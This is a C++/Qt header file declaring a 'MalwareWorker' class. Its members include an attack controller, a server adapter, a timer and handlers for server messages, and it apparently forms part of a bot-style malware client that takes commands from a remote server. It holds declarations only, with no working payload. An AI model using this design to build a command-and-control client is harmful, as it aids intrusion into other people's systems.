#ifndef MALWAREWORKER_H
#define MALWAREWORKER_H

#include <memory>

#include <QObject>
#include <QTimer>

#include "../Controllers/attackcontroller.h"
#include "../SharedKernel/Network/serveradapter.h"
#include "../Processors/processorresolverbase.h"

namespace workers
{
    class MalwareWorker : public QObject
    {
        Q_OBJECT

    public:
        MalwareWorker();

    private:
        std::unique_ptr<controllers::AttackController> attackController_;
        std::unique_ptr<network::ServerAdapter> serverAdapter_;
        std::unique_ptr<processors::ProcessorResolverBase> processorResolver_;
        std::unique_ptr<QTimer> timer_;
        bool hasEmittedHello_ = false;

    public slots:
        void doWork();

    private slots:
        void onTick();
        void onNewServerMessage(std::shared_ptr<network::messages::server::ServerMessage> message);
        void onServerReplied();
    };
}

#endif // MALWAREWORKER_H
